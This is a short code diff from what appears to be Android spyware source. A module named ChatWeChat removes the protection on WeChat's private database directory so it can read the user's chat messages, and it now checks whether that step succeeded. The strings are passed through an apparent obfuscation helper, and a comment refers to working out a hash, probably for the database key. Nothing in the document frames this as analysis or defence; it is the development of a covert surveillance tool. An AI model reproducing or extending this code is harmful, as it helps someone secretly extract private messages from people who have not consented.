@@ -104,7 +104,13 @@ public class ChatWeChat extends SubModuleChat {
 			lastLine = markup.unserialize(new Long(0));
 
 			// Get DB Dir
-			Path.unprotect(M.e("/data/data/com.tencent.mm/MicroMsg/"));
+			boolean ret = Path.unprotect(M.e("/data/data/com.tencent.mm/MicroMsg/"), 2, false);
+			if(!ret){
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (readChatWeChatMessages) Error: cannot unprotect wechat");
+				}
+				return;
+			}
 
 			// Not the cleanest solution, we should figure out how the hash is
 			// generated
